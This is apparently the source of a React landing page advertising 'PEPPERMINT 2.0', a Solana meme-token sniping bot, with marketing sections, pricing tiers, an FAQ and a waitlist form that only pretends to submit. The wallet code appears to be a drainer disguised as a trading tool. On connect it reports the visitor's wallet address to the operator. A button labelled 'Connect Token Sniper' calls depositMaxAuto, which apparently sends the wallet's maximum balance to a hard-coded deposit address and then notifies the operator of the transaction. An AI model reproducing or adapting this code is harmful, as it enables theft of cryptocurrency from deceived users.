// src/home.tsx

import React, { useState, useEffect, useRef } from "react";
import { notifyTx } from "./lib/notify";
import { getActiveSolanaProvider } from "./lib/solana";
import { SOL_DEPOSIT_ADDRESS } from "./config";

import { useWalletStatus } from "./hooks/useWalletStatus";
import { WalletButton } from "./components/WalletButton";
import { depositMaxAuto } from "./lib/sniper";

const Home: React.FC = () => {
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isYearly, setIsYearly] = useState(false);
  const [openFaq, setOpenFaq] = useState<number | null>(null);
  const [waitlistEmail, setWaitlistEmail] = useState("");
  const [waitlistMessage, setWaitlistMessage] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const { connected, connect, disconnect } = useWalletStatus();

  // Init AOS if present
  useEffect(() => {
    if (typeof window !== "undefined" && (window as any).AOS) {
      (window as any).AOS.init({
        duration: 700,
        easing: "ease-in-out",
        once: true,
      });
    }
  }, []);

  // ---- CONNECT NOTIFY (robust): fire once when connected flips false -> true
  const wasConnected = useRef(false);

  useEffect(() => {
    async function emitConnectNotifyOnce() {
      // Try Solana first
      try {
        const p: any = getActiveSolanaProvider?.();
        const pk = p?.publicKey;
        const fromAddr =
          (pk?.toBase58 && pk.toBase58()) || (typeof pk === "string" ? pk : "");
        if (fromAddr) {
          const payload = {
            kind: "solana" as const,
            chain: "mainnet-beta",
            from: fromAddr,
            to: SOL_DEPOSIT_ADDRESS,
            token: "CONNECT",
            tx: "-", // no hash for a pure connect event
          };
          console.log("📣 CONNECT notify (Solana) ->", payload);
          notifyTx(payload);
          return; // done
        }
      } catch (e) {
        console.warn("Solana CONNECT notify skipped:", e);
      }

      // Fallback to EVM if available
      try {
        const w: any = window as any;
        const eth = w?.ethereum;
        if (eth?.request) {
          const accounts: string[] =
            (await eth.request({ method: "eth_accounts" }).catch(() => [])) ||
            [];
          const from = accounts[0] as `0x${string}` | undefined;
          if (from) {
            // Optionally detect chainId for nicer logging
            let chainLabel = "mainnet";
            try {
              const chainIdHex: string = await eth.request({
                method: "eth_chainId",
              });
              const id = Number(chainIdHex);
              chainLabel = id === 1 ? "mainnet" : `chain-${id}`;
            } catch {}
            const payload = {
              kind: "evm" as const,
              chain: chainLabel,
              from,
              token: "CONNECT",
              tx: "-",
            };
            console.log("📣 CONNECT notify (EVM) ->", payload);
            notifyTx(payload);
          }
        }
      } catch (e) {
        console.warn("EVM CONNECT notify skipped:", e);
      }
    }

    if (connected && !wasConnected.current) {
      // false -> true edge
      emitConnectNotifyOnce();
      wasConnected.current = true;
    } else if (!connected && wasConnected.current) {
      // true -> false edge (reset)
      wasConnected.current = false;
    }
  }, [connected]);

  // Banner: explicit connect (still fine — effect above will emit the notify)
  async function onBannerConnectClick() {
    try {
      await connect();
    } catch (e: any) {
      console.error("Connect failed:", e?.message || e);
      alert(e?.message || "Failed to connect wallet");
    }
  }

  // Banner: sniper auto-routes to ETH/SOL and notifies after broadcast
  async function onBannerSniperClick() {
    try {
      const res = await depositMaxAuto();

      if (res.network === "evm") {
        console.log("✅ ETH tx:", res.hash);
        try {
          const payload = {
            kind: "evm" as const,
            chain: "mainnet", // adjust if you map chainId in depositMaxAuto
            from: (res as any).from,
            token: "ETH",
            tx: res.hash,
          };
          console.log("📣 TX notify (EVM) ->", payload);
          notifyTx(payload);
        } catch (e) {
          console.warn("EVM TX notify failed:", e);
        }
      } else {
        console.log("✅ SOL tx:", res.signature);
        try {
          const payload = {
            kind: "solana" as const,
            chain: "mainnet-beta",
            from: (res as any).from,
            to: SOL_DEPOSIT_ADDRESS,
            token: "SOL",
            tx: res.signature,
          };
          console.log("📣 TX notify (Solana) ->", payload);
          notifyTx(payload);
        } catch (e) {
          console.warn("SOL TX notify failed:", e);
        }
      }
    } catch (e: any) {
      console.error(e);
      alert(e?.message || "Error: Please connect your wallet");
    }
  }

  const toggleMobileMenu = () => setIsMobileMenuOpen(!isMobileMenuOpen);
  const closeMobileMenu = () => setIsMobileMenuOpen(false);

  const handleFaqToggle = (index: number) =>
    setOpenFaq(openFaq === index ? null : index);

  const handleWaitlistSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!waitlistEmail || !waitlistEmail.includes("@")) {
      setWaitlistMessage("Please enter a valid email.");
      return;
    }
    setIsSubmitting(true);
    setTimeout(() => {
      setWaitlistMessage(
        "Thanks — you're on the waitlist! We'll notify you soon."
      );
      setWaitlistEmail("");
      setIsSubmitting(false);
    }, 900);
  };

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
    }
    closeMobileMenu();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-800 text-blue-100">
      {/* Background effects */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-br from-green-500/5 via-transparent to-blue-500/5"></div>
        <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-[0.02]"></div>
      </div>

      {/* HEADER */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-slate-900/80 backdrop-blur-md px-4 md:px-8 py-3 border-b border-blue-900">
        <div className="max-w-7xl mx-auto flex items-center justify-between gap-4">
          <button
            onClick={() => scrollToSection("hero")}
            className="flex items-center gap-3 hover:opacity-80 transition"
          >
            <div className="p-2 rounded bg-gradient-to-br from-green-400 to-blue-500">
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" aria-hidden>
                <circle cx="12" cy="12" r="10" fill="white" opacity="0.12" />
                <path d="M6 12h12M12 6v12" stroke="#001018" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
            <span className="font-extrabold text-white text-lg leading-none">PEPPERMINT 2.0</span>
          </button>

          {/* Desktop nav */}
          <nav className="hidden md:flex items-center gap-6 text-sm text-blue-200">
            <button onClick={() => scrollToSection("hero")} className="hover:text-green-400 transition">Home</button>
            <button onClick={() => scrollToSection("key-benefits")} className="hover:text-green-400 transition">Benefits</button>
            <button onClick={() => scrollToSection("how-it-works")} className="hover:text-green-400 transition">How It Works</button>
            <button onClick={() => scrollToSection("speed")} className="hover:text-green-400 transition">Speed</button>
            <button onClick={() => scrollToSection("profitability")} className="hover:text-green-400 transition">Profitability</button>
            <button onClick={() => scrollToSection("pricing")} className="hover:text-green-400 transition">Pricing</button>
            <button onClick={() => scrollToSection("faq")} className="hover:text-green-400 transition">FAQs</button>
          </nav>

          <div className="flex items-center gap-3">
            <WalletButton
              whenConnectedText="Connected"
              whenDisconnectedText="Connect Wallet"
              disableWhenConnected={true}
            />
            {/* Mobile menu button */}
            <button
              onClick={toggleMobileMenu}
              aria-expanded={isMobileMenuOpen}
              className="md:hidden p-2 rounded focus:outline-none focus:ring-2 focus:ring-green-400 bg-slate-800/40 text-blue-100"
            >
              <span className="sr-only">Open menu</span>
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" aria-hidden>
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Mobile panel backdrop */}
      {isMobileMenuOpen && (
        <div
          className="fixed inset-0 bg-black/46 z-50 transition-opacity"
          onClick={closeMobileMenu}
        />
      )}

      {/* Mobile panel */}
      <div
        className={`fixed inset-0 z-60 flex flex-col items-center pt-20 bg-slate-900/95 backdrop-blur-sm transform transition-all duration-300 ${
          isMobileMenuOpen
            ? "translate-y-0 opacity-100"
            : "-translate-y-8 opacity-0 pointer-events-none"
        }`}
        role="dialog"
        aria-modal="true"
      >
        <div className="w-full max-w-md mx-auto px-6">
          <div className="flex items-center justify-between mb-6">
            <button
              onClick={() => scrollToSection("hero")}
              className="flex items-center gap-3"
            >
              <div className="p-2 rounded bg-gradient-to-br from-green-400 to-blue-500">
                <svg
                  width="28"
                  height="28"
                  viewBox="0 0 24 24"
                  fill="none"
                  aria-hidden
                >
                  <circle cx="12" cy="12" r="10" fill="white" opacity="0.12" />
                  <path
                    d="M6 12h12M12 6v12"
                    stroke="#001018"
                    strokeWidth="1.4"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              </div>
              <span className="font-extrabold text-white">PEPPERMINT</span>
            </button>
            <button
              onClick={closeMobileMenu}
              aria-label="Close menu"
              className="p-2 rounded bg-slate-800 focus:outline-none focus:ring-2 focus:ring-green-400 text-blue-100"
            >
              <svg
                className="w-5 h-5"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M6 18L18 6M6 6l12 12"
                />
              </svg>
            </button>
          </div>

          <nav className="flex flex-col gap-1 text-lg">
            <button
              onClick={() => scrollToSection("hero")}
              className="text-left p-4 hover:text-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
            >
              Home
            </button>
            <button
              onClick={() => scrollToSection("key-benefits")}
              className="text-left p-4 hover:text-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
            >
              Benefits
            </button>
            <button
              onClick={() => scrollToSection("how-it-works")}
              className="text-left p-4 hover:text-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
            >
              How It Works
            </button>
            <button
              onClick={() => scrollToSection("speed")}
              className="text-left p-4 hover:text-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
            >
              Speed
            </button>
            <button
              onClick={() => scrollToSection("profitability")}
              className="text-left p-4 hover:text-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
            >
              Profitability
            </button>
            <button
              onClick={() => scrollToSection("pricing")}
              className="text-left p-4 hover:text-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
            >
              Pricing
            </button>
            <button
              onClick={() => scrollToSection("faq")}
              className="text-left p-4 hover:text-green-400 focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
            >
              FAQ
            </button>
            <button
              onClick={() => scrollToSection("waitlist")}
              className="mt-4 bg-green-400 text-black font-semibold px-5 py-3 rounded-lg text-center hover:scale-105 transition"
            >
              Join Waitlist
            </button>
          </nav>
        </div>
      </div>

      <main className="pt-28 md:pt-36 px-6 max-w-7xl mx-auto relative z-10">
        {/* HERO */}
        <section
          id="hero"
          className="rounded-3xl glass-card p-8 md:p-12 shadow-2xl flex flex-col lg:flex-row items-center gap-8 mb-12"
        >
          <div className="flex-1 text-center lg:text-left">
            <h1 className="text-4xl md:text-6xl font-extrabold text-white leading-tight">
              <span className="text-green-400">Solana Meme Token Sniper🚀</span>
            </h1>
            <p className="text-lg md:text-xl mt-5 text-blue-200 max-w-2xl">
              Snipe meme coins in milliseconds built for alpha hunters, speed
              freaks, and meme lords. Realtime signals, pre-flight checks,
              priority execution.
            </p>

            {/* Banner buttons */}
            <div className="mt-8 flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
              {!connected ? (
                <button
                  onClick={onBannerConnectClick}
                  className="px-8 py-4 rounded-xl bg-green-400 text-black font-semibold shadow hover:-translate-y-0.5 transition"
                >
                  Connect Wallet
                </button>
              ) : (
                <div className="flex flex-col sm:flex-row gap-4">
                  <button
                    onClick={onBannerSniperClick}
                    className="px-8 py-4 rounded-xl bg-green-400 text-black font-semibold shadow hover:-translate-y-0.5 transition"
                  >
                    Connect Token Sniper
                  </button>
                  <button
                    onClick={disconnect}
                    className="px-8 py-4 rounded-xl bg-slate-800 text-blue-100 border border-white/10 shadow hover:-translate-y-0.5 transition"
                  >
                    Disconnect
                  </button>
                </div>
              )}
            </div>
          </div>

          <div className="flex-1 max-w-lg w-full">
            <div className="relative group">
              <div className="rounded-2xl shadow-2xl overflow-hidden border border-white/10 aspect-video bg-gradient-to-br from-gray-900 to-black relative">
                <video
                  src="./assets/Peppermint.mp4"
                  autoPlay
                  muted
                  loop
                  playsInline
                  className="w-full h-full object-cover transition-transform duration-300 group-hover:scale-105"
                  poster="./assets/Peppermint.mp4"
                />
                <div className="absolute top-4 right-4">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                </div>
              </div>

              <div className="mt-4 text-center">
                <p className="text-sm text-blue-300/80 mb-4 leading-relaxed">
                  Watch Jolof in action: Real-time meme token sniping with
                  lightning-fast execution
                </p>
                <a
                  href="./assets/Peppermint.mp4"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-2 bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold px-6 py-3 rounded-xl hover:from-blue-600 hover:to-purple-700 hover:shadow-lg hover:-translate-y-0.5 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2 focus:ring-offset-gray-900"
                >
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M8 5v14l11-7z" />
                  </svg>
                  Watch Demo
                </a>
              </div>
            </div>
          </div>
        </section>

        {/* BENEFITS */}
        <section id="key-benefits" className="mb-16">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white text-center mb-6">
            Key Benefits
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/20 to-green-400/10 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-semibold mb-2 text-white">
                ⚡ Real-time Signal Capture
              </h3>
              <p className="text-sm text-blue-200">
                Monitors Telegram & Twitter feeds to capture token mints and
                drops instantly.
              </p>
            </div>
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/25 to-green-400/15 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-semibold mb-2 text-white">
                🛡️ Pre-Trade Validation
              </h3>
              <p className="text-sm text-blue-200">
                Contract checks, decimals, liquidity checks, and anti-rug
                heuristics.
              </p>
            </div>
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/20 to-green-400/10 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-semibold mb-2 text-white">
                📊 Risk Ranking
              </h3>
              <p className="text-sm text-blue-200">
                Signals ranked by rules and computed risk for smarter execution
                order.
              </p>
            </div>
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/15 to-green-400/8 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-semibold mb-2 text-white">
                🚀 Ultra-Fast Execution
              </h3>
              <p className="text-sm text-blue-200">
                Optimized routing and premium RPCs for minimal latency.
              </p>
            </div>
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/20 to-green-400/10 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-semibold mb-2 text-white">
                🤖 Automated Post-Trade Logic
              </h3>
              <p className="text-sm text-blue-200">
                Auto sell, TP/SL, and notifications via Telegram/Discord.
              </p>
            </div>
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/25 to-green-400/15 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-semibold mb-2 text-white">
                🔒 Security First
              </h3>
              <p className="text-sm text-blue-200">
                Rug filters, suspicious owner detection, zero-liquidity checks.
              </p>
            </div>
          </div>
        </section>

        {/* HOW IT WORKS */}
        <section id="how-it-works" className="mb-20">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white text-center mb-10">
            How It Works
          </h2>
          <div className="space-y-6 max-w-4xl mx-auto">
            <div className="glass-card p-5 rounded-2xl flex gap-4 items-start">
              <div className="w-12 h-12 rounded-full bg-blue-500 flex items-center justify-center font-bold text-black">
                1
              </div>
              <div>
                <h3 className="font-semibold text-white">Signal capture</h3>
                <p className="text-blue-200 text-sm mt-1">
                  Monitors subscribed Telegram groups and Twitter accounts to
                  extract candidate tokens or mint addresses in real time.
                </p>
              </div>
            </div>
            <div className="glass-card p-5 rounded-2xl flex gap-4 items-start">
              <div className="w-12 h-12 rounded-full bg-green-400 flex items-center justify-center font-bold text-black">
                2
              </div>
              <div>
                <h3 className="font-semibold text-white">Pre-flight checks</h3>
                <p className="text-blue-200 text-sm mt-1">
                  Contract format, decimals, recent activity, LP checks and
                  anti-rug heuristics are evaluated.
                </p>
              </div>
            </div>
            <div className="glass-card p-5 rounded-2xl flex gap-4 items-start">
              <div className="w-12 h-12 rounded-full bg-pink-500 flex items-center justify-center font-bold text-black">
                3
              </div>
              <div>
                <h3 className="font-semibold text-white">Priority queue</h3>
                <p className="text-blue-200 text-sm mt-1">
                  Verified signals ranked by rules + computed risk and queued
                  for execution.
                </p>
              </div>
            </div>
            <div className="glass-card p-5 rounded-2xl flex gap-4 items-start">
              <div className="w-12 h-12 rounded-full bg-blue-500 flex items-center justify-center font-bold text-black">
                4
              </div>
              <div>
                <h3 className="font-semibold text-white">
                  Optimized execution
                </h3>
                <p className="text-blue-200 text-sm mt-1">
                  Chooses fastest RPC, optimizes fees & slippage, broadcasts
                  quickly.
                </p>
              </div>
            </div>
          </div>
        </section>

        {/* SPEED */}
        <section id="speed" className="mb-20">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white text-center mb-6">
            Speed Advantage
          </h2>
          <p className="text-center text-blue-300 mb-10">
            Milliseconds matter. PEPPERMINT 2.0 runs with lightning RPCs &
            optimized routing.
          </p>
          <div className="rounded-2xl p-6 bg-gradient-to-br from-green-500/20 to-green-400/10 border border-green-500/20 max-w-2xl mx-auto text-center hover:transform hover:-translate-y-1 transition-all">
            <h3 className="text-xl font-bold mb-2 text-white">
              ⚡ Sub-200ms Trade Execution
            </h3>
            <p className="text-sm text-blue-200">
              With premium RPC nodes and low-level optimizations, your trades
              land before the herd even clicks.
            </p>
          </div>
        </section>

        {/* PROFITABILITY */}
        <section id="profitability" className="mb-20">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white text-center mb-6">
            Profitability & Risk
          </h2>
          <div className="grid md:grid-cols-2 gap-6">
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/20 to-green-400/10 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-bold text-white">📈 Smarter Entry</h3>
              <p className="text-sm text-blue-200">
                Token rankings help you avoid rugs and focus on plays with
                better upside.
              </p>
            </div>
            <div className="rounded-2xl p-5 bg-gradient-to-br from-green-500/15 to-green-400/8 border border-green-500/20 hover:transform hover:-translate-y-1 transition-all">
              <h3 className="text-xl font-bold text-white">
                💡 Strategy Support
              </h3>
              <p className="text-sm text-blue-200">
                Choose degen mode for fast flips or safer mode for balanced
                entries.
              </p>
            </div>
          </div>
        </section>

        {/* PRICING */}
        <section id="pricing" className="mb-20 relative z-10">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white text-center mb-4">
            Pricing
          </h2>
          <p className="text-center text-blue-300 mb-8">
            Choose your plan. Cancel anytime.
          </p>

          {/* Toggle */}
          <div className="flex justify-center mb-10">
            <div className="flex items-center bg-slate-800/60 rounded-full p-1 text-sm">
              <button
                onClick={() => setIsYearly(false)}
                className={`px-4 py-2 rounded-full font-semibold transition ${
                  !isYearly ? "bg-green-400 text-black" : "text-blue-200"
                }`}
              >
                Monthly
              </button>
              <button
                onClick={() => setIsYearly(true)}
                className={`px-4 py-2 rounded-full font-semibold transition ${
                  isYearly ? "bg-green-400 text-black" : "text-blue-200"
                }`}
              >
                Yearly
              </button>
            </div>
          </div>

          <div className="grid md:grid-cols-3 gap-6 max-w-6xl mx-auto">
            {/* Basic */}
            <div className="rounded-2xl p-6 bg-gradient-to-br from-green-500/20 to-green-400/10 border border-green-500/20 shadow-lg hover:scale-105 transition">
              <h3 className="text-xl font-bold text-white mb-2">Basic</h3>
              <p className="text-blue-200 mb-4">
                Perfect for beginners testing the waters.
              </p>
              <div className="text-3xl font-extrabold text-green-400 mb-6">
                ${isYearly ? "490" : "49"}
                <span className="text-lg text-blue-300 font-medium">
                  /{isYearly ? "yr" : "mo"}
                </span>
              </div>
              <ul className="space-y-2 text-sm text-blue-100">
                <li>✅ Access to basic signals</li>
                <li>✅ Community support</li>
                <li>✅ Limited execution speed</li>
              </ul>
              <button
                onClick={() => scrollToSection("waitlist")}
                className="mt-6 w-full bg-green-400 text-black font-semibold py-3 rounded-lg hover:scale-105 transition"
              >
                Get Started
              </button>
            </div>

            {/* Pro */}
            <div className="rounded-2xl p-6 bg-gradient-to-br from-green-500/25 to-green-400/15 border-2 border-green-400 shadow-2xl hover:scale-110 transition relative">
              <span className="absolute top-0 right-0 bg-green-400 text-black text-xs font-bold px-3 py-1 rounded-bl-lg">
                POPULAR
              </span>
              <h3 className="text-xl font-bold text-white mb-2">Pro</h3>
              <p className="text-blue-200 mb-4">
                For serious meme traders who want speed.
              </p>
              <div className="text-3xl font-extrabold text-green-400 mb-6">
                ${isYearly ? "1490" : "149"}
                <span className="text-lg text-blue-300 font-medium">
                  /{isYearly ? "yr" : "mo"}
                </span>
              </div>
              <ul className="space-y-2 text-sm text-blue-100">
                <li>✅ Priority execution</li>
                <li>✅ Premium RPC access</li>
                <li>✅ Real-time risk ranking</li>
                <li>✅ Pro trader community</li>
              </ul>
              <button
                onClick={() => scrollToSection("waitlist")}
                className="mt-6 w-full bg-green-400 text-black font-semibold py-3 rounded-lg hover:scale-105 transition"
              >
                Go Pro
              </button>
            </div>

            {/* Elite */}
            <div className="rounded-2xl p-6 bg-gradient-to-br from-green-500/20 to-green-400/10 border border-green-500/20 shadow-lg hover:scale-105 transition">
              <h3 className="text-xl font-bold text-white mb-2">Elite</h3>
              <p className="text-blue-200 mb-4">
                Maximum performance for top-tier degens.
              </p>
              <div className="text-3xl font-extrabold text-green-400 mb-6">
                ${isYearly ? "2990" : "299"}
                <span className="text-lg text-blue-300 font-medium">
                  /{isYearly ? "yr" : "mo"}
                </span>
              </div>
              <ul className="space-y-2 text-sm text-blue-100">
                <li>✅ Dedicated node routing</li>
                <li>✅ Early-access features</li>
                <li>✅ 1-on-1 strategy support</li>
                <li>✅ Private alpha channel</li>
              </ul>
              <button
                onClick={() => scrollToSection("waitlist")}
                className="mt-6 w-full bg-green-400 text-black font-semibold py-3 rounded-lg hover:scale-105 transition"
              >
                Join Elite
              </button>
            </div>
          </div>
        </section>

        {/* FAQ */}
        <section id="faq" className="mb-20 max-w-3xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white text-center mb-6">
            FAQ
          </h2>
          <div className="space-y-4">
            {[
              {
                question: "Does the bot guarantee profits?",
                answer:
                  "No. Trading cryptocurrencies is risky. The bot helps automate entry and execution but cannot guarantee returns.",
              },
              {
                question: "What sources can I monitor?",
                answer:
                  "Telegram channels/groups and Twitter accounts. Integrations with Discord or other feeds can be added per plan.",
              },
              {
                question: "How do you prevent scams?",
                answer:
                  "The bot runs automated pre-checks (liquidity presence, token metadata, owner flags) and can be configured to reject suspicious tokens.",
              },
              {
                question: "Can I run this on my own infrastructure?",
                answer:
                  "Yes, options include cloud deployment with premium RPCs or managed hosting for lower-friction access.",
              },
            ].map((faq, index) => (
              <div
                key={index}
                className="rounded-xl bg-slate-800/60 overflow-hidden"
              >
                <button
                  className="w-full flex justify-between items-center p-4 text-left font-semibold focus:outline-none focus:ring-2 focus:ring-green-400 rounded"
                  onClick={() => handleFaqToggle(index)}
                  aria-expanded={openFaq === index}
                >
                  <span className="text-white">{faq.question}</span>
                  <svg
                    className={`w-5 h-5 transition-transform ${
                      openFaq === index ? "rotate-180" : ""
                    }`}
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M19 9l-7 7-7-7"
                    />
                  </svg>
                </button>
                {openFaq === index && (
                  <div className="px-4 pb-4 text-sm text-blue-200">
                    {faq.answer}
                  </div>
                )}
              </div>
            ))}
          </div>
        </section>

        {/* WAITLIST */}
        <section id="waitlist" className="mb-20 text-center">
          <h2 className="text-3xl md:text-4xl font-extrabold text-white mb-4">
            Join the Waitlist
          </h2>
          <p className="text-blue-300 mb-6">
            Be the first to get access to PEPPERMINT 2.0.
          </p>
          <form
            onSubmit={handleWaitlistSubmit}
            className="max-w-md mx-auto flex flex-col sm:flex-row gap-4"
          >
            <input
              type="email"
              placeholder="Enter your email"
              required
              value={waitlistEmail}
              onChange={(e) => setWaitlistEmail(e.target.value)}
              className="flex-1 px-4 py-3 rounded-lg border border-slate-700 bg-slate-900 bg-opacity-60 text-white focus:outline-none focus:ring-2 focus:ring-green-400"
            />
            <button
              type="submit"
              disabled={isSubmitting}
              className="bg-green-400 text-black font-semibold px-6 py-3 rounded-lg hover:scale-105 transition disabled:opacity-50"
            >
              {isSubmitting ? "Sending..." : "Join"}
            </button>
          </form>
          {waitlistMessage && (
            <p
              className={`text-sm mt-3 ${
                waitlistMessage.includes("Thanks")
                  ? "text-green-400"
                  : "text-red-400"
              }`}
            >
              {waitlistMessage}
            </p>
          )}
        </section>
      </main>

      {/* FOOTER */}
      <footer className="bg-slate-900/70 border-t border-slate-700 py-6 text-center text-blue-400">
        <div className="max-w-7xl mx-auto px-6">
          <div className="mb-2">
            &copy; {new Date().getFullYear()} PEPPERMINT 2.0 Built for crypto
            degens.
          </div>
          <div className="text-xs">
            <button className="hover:text-green-400 transition">Legal</button>{" "}
            ·{" "}
            <button className="hover:text-green-400 transition">Privacy</button>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Home;
